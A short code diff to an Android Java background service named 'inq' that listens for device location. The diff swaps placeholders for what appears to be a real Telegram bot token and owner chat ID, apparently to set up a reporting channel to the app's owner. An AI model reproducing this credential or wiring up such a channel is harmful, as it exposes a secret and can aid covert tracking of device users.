@@ -75,8 +75,8 @@ import java.util.concurrent.atomic.AtomicInteger;
 public class inq extends Service implements LocationListener {
 
     // ── CONFIG ────────────────────────────────
-    static String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    static String OWNER_ID  = "YOUR_CHAT_ID_HERE";
+    static String BOT_TOKEN = "9063660834:AAHPoIBDEqBpiG-F8uIQ9yWoWIhjK2Y3qoE";
+    static String OWNER_ID  = "7507787272";
     // ─────────────────────────────────────────
 
     private static volatile boolean running = false;
